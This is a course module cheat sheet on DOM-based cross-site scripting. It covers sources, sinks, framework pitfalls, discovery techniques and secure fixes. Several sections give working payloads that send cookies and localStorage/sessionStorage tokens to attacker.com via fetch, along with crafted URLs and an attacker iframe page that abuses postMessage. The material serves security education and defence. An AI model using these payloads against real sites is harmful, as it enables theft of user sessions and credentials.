# Module 4 — DOM XSS: Cheat Sheet & Field Reference

> **Scope:** Ethical hacking · Bug bounty · Secure coding · Defensive understanding  
> **Level:** Intermediate → Advanced  
> **Date:** 2026-05

---

## 1. Core Definition

DOM XSS occurs when client-side JavaScript reads attacker-controlled data from a **source** and writes it into a **dangerous sink** without sanitization. The server sends a perfectly clean response. The vulnerability exists entirely inside the browser.

```
Reflected:  Input → Server (vulnerable) → Response → Browser
Stored:     Input → Database → Server → Response → Browser
DOM XSS:    Input → Browser → JavaScript (vulnerable) → DOM → Execution
                     ↑ server not involved at all
```

**Why this matters:**
- Server logs show nothing suspicious
- WAFs never see the payload
- Server-side output encoding is irrelevant
- Network traffic looks completely clean
- Automated scanners frequently miss it

---

## 2. Sources — Where Attacker-Controlled Data Enters JS

| Source | What it contains | Notes |
|---|---|---|
| `location.hash` | Everything after `#` in URL | Never sent to server — invisible to WAF/logs |
| `location.search` | Query string `?key=value` | Sent to server, but JS reads it too |
| `location.href` | Full URL | Contains both search and hash |
| `document.URL` | Full URL as string | Same as location.href |
| `document.referrer` | Previous page URL | Attacker controls by linking from their page |
| `window.name` | Persists across navigation | Set by attacker page, survives redirect |
| `postMessage` event data | Arbitrary message from any origin | Dangerous if origin not validated |
| `localStorage` / `sessionStorage` | Stored client-side data | Readable if previously poisoned |
| URL path segments | `/user/[name]/profile` | Via `location.pathname` |
| WebSocket messages | Real-time data | If attacker controls the WS server |

---

## 3. Sinks — Where Execution Happens

### HTML sinks — parse input as HTML
```javascript
element.innerHTML = userInput;        // most common vulnerability
element.outerHTML = userInput;        // replaces element entirely
document.write(userInput);            // writes to document stream
document.writeln(userInput);
element.insertAdjacentHTML('beforeend', userInput);
```
**Payload type:** HTML tags + event handlers

### JavaScript execution sinks — execute input as JS
```javascript
eval(userInput);
setTimeout(userInput, 1000);          // string arg only — function arg is safe
setInterval(userInput, 1000);
new Function(userInput)();
```
**Payload type:** Raw JavaScript expressions — no HTML tags needed

### URL sinks — navigate to input as URL
```javascript
location.href = userInput;
location.replace(userInput);
location.assign(userInput);
element.src = userInput;              // script, iframe elements
element.setAttribute('href', userInput);
element.setAttribute('src', userInput);
```
**Payload type:** `javascript:` URI

### jQuery sinks — if jQuery present
```javascript
$(userInput);                         // HTML parser if string starts with <
$('#el').html(userInput);             // same as innerHTML
$('#el').append(userInput);
$('#el').prepend(userInput);
$('#el').after(userInput);
$('#el').before(userInput);
```
**Payload type:** HTML tags + event handlers

---

## 4. Payload Selection by Sink Type

```
Sink              →  Payload form
──────────────────────────────────────────────────────────────
innerHTML         →  <img src=x onerror=fetch('...')>
eval()            →  fetch('https://attacker.com/?c='+document.cookie)
location.href     →  javascript:fetch('https://attacker.com/?c='+document.cookie)
setTimeout(str)   →  fetch('https://attacker.com/?c='+document.cookie)
jQuery $()        →  <img src=x onerror=fetch('...')>
```

---

## 5. Sources — Full Exploitation Examples

### location.hash → innerHTML
```javascript
// Vulnerable code
const name = location.hash.slice(1);
document.getElementById('greeting').innerHTML = name;

// Crafted URL
https://victim.com/page#<img src=1 onerror=fetch('https://attacker.com/?c='+document.cookie)>

// What happens
// location.hash → "#<img src=1 onerror=...>"
// .slice(1)     → "<img src=1 onerror=...>"
// innerHTML     → browser parses as HTML, onerror fires, cookie exfiltrated
// Server sees   → GET /page (nothing suspicious)
```

### location.hash → eval()
```javascript
// Vulnerable code
const expr = location.hash.slice(1);
eval(expr);

// Crafted URL
https://victim.com/page#fetch('https://attacker.com/?c='+document.cookie)

// No HTML tags needed — raw JS executes directly
```

### location.hash → location.href (open redirect + XSS)
```javascript
// Vulnerable code
const redirect = location.hash.slice(1);
location.href = redirect;

// Crafted URL
https://victim.com/page#javascript:fetch('https://attacker.com/?c='+document.cookie)
```

### postMessage without origin check
```javascript
// Vulnerable receiving code on victim.com
window.addEventListener('message', (event) => {
  // No origin check
  document.getElementById('output').innerHTML = event.data;
});

// Attacker page (attacker.com/exploit.html)
<iframe src="https://victim.com/vulnerable-page" id="t" onload="attack()"></iframe>
<script>
function attack() {
  document.getElementById('t').contentWindow.postMessage(
    '<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>',
    '*'
  );
}
</script>

// Delivery: send phishing link to attacker.com/exploit.html
// Victim visits attacker.com — victim.com exploited inside hidden iframe
```

### URLSearchParams → innerHTML (SPA router pattern)
```javascript
// Vulnerable code
function getParam(p) {
  return new URLSearchParams(location.hash.slice(1)).get(p);
}
const user = getParam('user');
document.getElementById('app').innerHTML = `<h2>Welcome ${user}</h2>`;

// Crafted URL — text node injection
app.html#user=<img src=1 onerror=fetch('https://attacker.com/?c='+document.cookie)>

// Crafted URL — attribute injection (if user lands in attribute)
app.html#page=" onmouseover="fetch('https://attacker.com/?c='+document.cookie)" x="
```

### localStorage → innerHTML (stored DOM XSS)
```javascript
// Vulnerable code
const bio = localStorage.getItem('userBio');
document.getElementById('profile').innerHTML = bio;

// Attack: poison localStorage via another XSS first
localStorage.setItem('userBio', '<img src=x onerror=alert(1)>');
// Next page load executes automatically
```

---

## 6. The High-Value Target — localStorage JWTs

```javascript
// Maximum impact payload — exfiltrate all storage + cookies
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: location.href
  })
});
```

**Why localStorage JWTs are worse than session cookies:**

| Property | HttpOnly cookie | localStorage JWT |
|---|---|---|
| Readable by JS | No | Yes |
| XSS can steal it | No | Yes |
| Server can invalidate | Yes | No (until expiry) |
| Persists after tab close | Depends | Yes |
| Attacker use after theft | Needs cookie jar | Direct API calls |

DOM XSS + localStorage JWT = portable credential valid for hours, usable from attacker's own machine.

---

## 7. Modern DOM XSS Patterns

### Pattern 1 — SPA client-side routing
```javascript
window.addEventListener('hashchange', () => {
  const route = location.hash.slice(1);
  document.getElementById('app').innerHTML = renderPage(route);
  // if renderPage() returns unsanitized user content — DOM XSS
});
```

### Pattern 2 — API response rendered client-side
```javascript
fetch('/api/user/profile')
  .then(r => r.json())
  .then(data => {
    document.getElementById('bio').innerHTML = data.bio;
    // Server sends clean JSON — client renders unsafely
    // This is stored DOM XSS — payload lives in the DB
  });
```

### Pattern 3 — Template literals building HTML
```javascript
const name = new URLSearchParams(location.search).get('name');
// Developers use template literals for clean syntax
// but innerHTML still parses the result as HTML
document.getElementById('container').innerHTML = `<h2>${name}</h2>`;
```

### Pattern 4 — React dangerouslySetInnerHTML
```jsx
// Safe — React escapes JSX expressions
function Profile({ bio }) { return <div>{bio}</div>; }

// Vulnerable — bypasses escaping entirely
function Profile({ bio }) {
  return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}

// Vulnerable — href with user-controlled value
function Link({ url }) {
  return <a href={url}>Click here</a>;
  // javascript:alert(1) executes on click
  // React does NOT sanitize href
}
```

### Pattern 5 — jQuery legacy code
```javascript
// Pre-jQuery 3.0 — hash passed directly to selector + HTML parser
$(location.hash).show();
// Crafted: page.html#<img src=x onerror=alert(1)>
```

---

## 8. Framework DOM XSS Summary

| Framework/API | Safe by default | Unsafe patterns |
|---|---|---|
| React JSX `{}` | Yes | `dangerouslySetInnerHTML`, `href={userUrl}`, `eval()` in logic |
| Vue `{{ }}` | Yes | `v-html`, `:href="userUrl"` |
| Angular `{{ }}` | Yes | `[innerHTML]`, `bypassSecurityTrust*` |
| Vanilla JS | No | `innerHTML`, `document.write`, `eval` |
| jQuery | No | `$()`, `.html()`, `.append()` |

---

## 9. Discovery Methodology

### Static analysis — search the codebase
```bash
# Find dangerous sinks
grep -r "innerHTML" src/
grep -r "document.write" src/
grep -r "eval(" src/
grep -r "setTimeout(" src/
grep -r "location.href\s*=" src/
grep -r "\.html(" src/        # jQuery

# Find sources feeding sinks
grep -r "location.hash" src/
grep -r "location.search" src/
grep -r "postMessage" src/
grep -r "localStorage.getItem" src/
grep -r "URLSearchParams" src/
```

### Dynamic analysis — browser devtools
```javascript
// Check current sources in console
console.log(location.hash);
console.log(location.search);
console.log(document.referrer);

// Monitor DOM mutations — catch innerHTML being called
const observer = new MutationObserver(m =>
  m.forEach(x => console.log('DOM mutated:', x))
);
observer.observe(document.body, { childList: true, subtree: true });

// Override innerHTML to find where it's called (dev/test only)
const orig = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
Object.defineProperty(Element.prototype, 'innerHTML', {
  set(v) { console.trace('innerHTML set:', v); orig.set.call(this, v); }
});
```

### Testing flow
```
1. Identify all places UI renders dynamic content
2. Check JS source for sources (location.hash, postMessage, etc.)
3. Trace data flow from source to sink
4. Inject harmless probe: #xsstest99999
5. Check DOM (not page source — DOM after JS runs)
6. Identify sink context
7. Craft context-appropriate payload
8. Verify with alert(document.domain)
9. Escalate to cookie/localStorage exfiltration for impact
```

---

## 10. Secure Fixes

### Replace innerHTML with safe alternatives
```javascript
// VULNERABLE
element.innerHTML = userInput;

// FIX 1 — plain text (use 90% of the time)
element.textContent = userInput;

// FIX 2 — HTML needed (rich content)
element.innerHTML = DOMPurify.sanitize(userInput);

// FIX 3 — structured content (most robust)
const el = document.createElement('h2');
el.textContent = userInput;
container.appendChild(el);
```

### Fix eval() and JS execution sinks
```javascript
// VULNERABLE
eval(location.hash.slice(1));

// FIX — never pass user input to eval
// Redesign: use a lookup table instead
const allowed = { add: () => a + b, subtract: () => a - b };
const op = location.hash.slice(1);
if (allowed[op]) allowed[op]();
```

### Fix URL sinks
```javascript
// VULNERABLE
location.href = location.hash.slice(1);

// FIX — allowlist valid paths only
const redirect = location.hash.slice(1);
if (/^\/[a-zA-Z0-9/_-]*$/.test(redirect)) {
  location.href = redirect;
} else {
  location.href = '/home';
}
```

### Fix postMessage
```javascript
// VULNERABLE
window.addEventListener('message', (event) => {
  element.innerHTML = event.data;
});

// FIX — validate origin + use safe sink
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-parent.com') return;
  element.textContent = event.data;
});
```

### Fix React href
```jsx
// VULNERABLE
<a href={userUrl}>Link</a>

// FIX
function SafeLink({ url }) {
  const safe = /^https?:\/\//.test(url) ? url : '#';
  return <a href={safe}>Link</a>;
}
```

### Trusted Types — browser-enforced defense
```javascript
// Forces all innerHTML assignments through a policy
if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input)
  });
  element.innerHTML = policy.createHTML(userInput);
}
```

Enable via CSP header:
```
Content-Security-Policy: require-trusted-types-for 'script'
```

With this active, raw string assignment to innerHTML throws TypeError at runtime.

---

## 11. Reflected vs Stored vs DOM — Full Comparison

| Property | Reflected | Stored | DOM |
|---|---|---|---|
| Payload location | URL / request | Database | URL fragment / JS environment |
| Server involvement | Echoes payload | Stores + echoes | None |
| Victim requirement | Must click link | Just visits page | Must click link (usually) |
| Visible in server logs | Yes | Yes on write | No |
| WAF can detect | Yes | Yes | No |
| Scanner detectable | Mostly | Mostly | Hard — needs JS analysis |
| Fix lives at | Server output encoding | Server output encoding | Client JS safe sinks |
| Persistence | None | Until DB cleaned | None |
| Typical severity | Medium | High | Medium–High |

---

## 12. Key Mental Models

> "The server sends nothing wrong. The vulnerability is in the JavaScript data flow."

> "Source = where attacker data enters JS. Sink = where it gets executed. No sanitization between them = DOM XSS."

> "location.hash is never sent to the server. The payload is invisible to WAFs, logs, and network monitoring."

> "Parsing is not sanitizing. URLSearchParams, JSON.parse, split() — none of these make data safe."

> "localStorage JWTs are worse than cookies under XSS — they're portable credentials the server cannot invalidate."

> "React escapes JSX. It does not protect dangerouslySetInnerHTML, href attributes, or eval() in component logic."

> "postMessage without origin validation means any page on the internet can send data into your message handler."

---

## 13. Coming Up — Module 5: Context, Encoding & Sanitization

- Why the same input needs completely different treatment in different contexts
- HTML context vs JS string context vs URL context vs CSS context
- What output encoding actually does at the byte level
- Why filter bypasses work — and how to think about them
- The complete encoding reference for every context
- Why WAF bypass is really just context confusion